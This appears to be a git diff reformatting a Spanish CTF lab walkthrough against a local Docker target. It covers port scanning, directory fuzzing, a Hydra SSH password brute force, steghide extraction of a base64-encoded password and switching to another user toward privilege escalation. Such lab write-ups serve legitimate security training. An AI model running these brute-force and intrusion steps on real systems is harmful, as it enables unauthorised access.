@@ -46,56 +46,56 @@ chmod +x auto_deploy.sh
 
 ![DESPLIEGUE](Imagenes/DESP.jpg)
 
-🔍 Reconocimiento
-Obtener interfaz:
-
+## c. 🔍 Obtener interfaz:
 
 ip add
-## b.Descubrimiento de red:
 
+Descubrimiento de red:
 
 sudo netdiscover -i docker0 -r 172.17.0.0/24
-Escaneo de puertos:
-
+## d. Escaneo de puertos:
 
 sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
-🌐 Enumeración Web
-Accedemos al puerto 80 pero no hay información directa. Se lanza fuzzing:
 
+## e. 🌐 Enumeración Web
+Accedemos al puerto 80 pero no hay información directa. Se lanza fuzzing:
 
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 🔐 Ataque por Fuerza Bruta
 Usuarios encontrados en el HTML del sitio: carlota y juan.
 
-## c. Ataque SSH usando Hydra:
+## f. Ataque SSH usando Hydra:
 
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
-Accedemos vía SSH:
+
+## g. Accedemos vía SSH:
 
 ssh carlota@172.17.0.2
-🖼 Extracción de Evidencia
+
+## h. 🖼 Extracción de Evidencia
 Navegamos al directorio de imágenes:
 
 cd /carlota/Desktop/fotos/vacaciones
-Transferimos la imagen:
+
+## i. Transferimos la imagen:
 
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
 Inspeccionamos el tipo de archivo:
 
 
 file imagen.jpg
-🕵‍♀ Esteganografía
+
+## j. 🕵‍♀ Esteganografía
 Extraemos información oculta:
 
-
 steghide extract -sf imagen.jpg
-Decodificamos el contenido del archivo secreto:
 
+## k. Decodificamos el contenido del archivo secreto:
 
 echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
-🧑‍💻 Escalamiento de Privilegios
-Accedemos como otro usuario:
 
+## l.🧑‍💻 Escalamiento de Privilegios
+Accedemos como otro usuario:
 
 su oscar
 ## d.Comprobamos acceso con sudo:
